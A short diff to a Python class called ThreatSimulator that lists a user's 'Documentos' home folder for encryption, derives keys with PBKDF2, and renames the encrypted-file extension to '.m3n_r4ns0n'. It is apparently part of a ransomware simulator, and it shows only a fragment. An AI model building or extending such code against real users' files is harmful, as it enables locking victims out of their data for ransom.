@@ -16,7 +16,7 @@ class ThreatSimulator:
         self.home_directory = os.path.expanduser("~")
         self.documentos_folder = os.path.join(self.home_directory, 'Documentos')
         self.directories_to_encrypt = [self.documentos_folder]
-        self.extension = ".bsp"
+        self.extension = ".m3n_r4ns0n"
 
     def generate_key(self, password: bytes) -> bytes:
         from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
